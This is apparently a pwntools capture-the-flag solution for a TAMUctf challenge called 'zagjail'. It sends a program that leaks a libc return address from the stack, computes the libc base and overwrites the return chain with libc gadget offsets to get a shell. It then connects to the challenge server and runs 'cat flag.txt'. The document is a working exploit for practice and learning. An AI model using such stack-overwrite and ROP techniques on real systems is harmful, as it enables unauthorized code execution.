from time import sleep
from pwn import *
EXPLOIT = b"""fn main() i32 {
    var a:u64 = 0;
    var libc_ret:u64 = *(&a + 2);
    var libc_base:u64 = libc_ret - 171176;
    *(&a + 2) = libc_base + 164971;
    *(&a + 3) = libc_base + 172357;
    *(&a + 4) = libc_base + 1728164;
    *(&a + 5) = libc_base + 340240;
    *(&a + 6) = libc_base + 271200;
    return 0;
}
"""
io = remote("streams.tamuctf.com", 443, ssl=True, sni="zagjail")
io.clean(timeout=1)
io.send(EXPLOIT)
io.sendline(b"<EOF>")
io.clean(timeout=2)
io.sendline(b"cat flag.txt")
io.interactive(prompt="")
